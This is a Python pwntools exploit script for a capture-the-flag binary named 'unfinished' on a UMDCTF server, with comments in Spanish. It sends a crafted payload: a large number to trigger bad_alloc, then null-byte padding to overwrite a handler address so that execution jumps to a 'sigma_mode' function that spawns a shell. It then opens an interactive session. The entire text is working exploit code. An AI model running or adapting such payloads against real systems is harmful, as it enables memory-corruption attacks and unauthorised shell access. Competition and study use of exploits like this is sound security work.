from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#p = process("./unfinished")
p = remote("challs.umdctf.io",31003)
elf = context.binary = ELF("./unfinished")

#gdb.attach(p, gdbscript='''
#    x/40wx 0x0041f120  # Ver zona de handlers
#    break *sigma_mode  # Parar antes de ejecutar la shell
#    continue
#''')

input_start = 0x0041f060
target_addr = 0x0041f128
sigma_mode = 0x004019b6

# Calcular el offset
offset = target_addr - input_start

payload = b"1844674407370955161"  # Desencadenar bad_alloc
payload += b"\x00" * (offset - len(payload))
payload += p64(sigma_mode)

print(f"Payload: {payload} len:{len(payload)}")

p.sendline(payload)
p.interactive()
